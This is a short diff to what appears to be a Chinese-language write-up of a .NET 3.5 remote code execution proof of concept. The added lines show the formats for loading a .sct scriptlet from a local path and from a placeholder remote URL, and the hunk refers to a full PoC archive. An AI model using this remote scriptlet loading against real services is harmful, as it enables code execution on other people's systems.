@@ -512,6 +512,13 @@ run.sct加入资源文件
 
 
 ```
+
+  sct文件在本地格式:
+ "script:C:\dl\run.sct"
+   sct文件在远程格式:
+ "script:http://www.yourweb.com/run.sct"
+ 
+ 
 完整poc在DotNET3Dot5TypeFilterLevelLowRce.7z
 
 ## 运行效果 ##
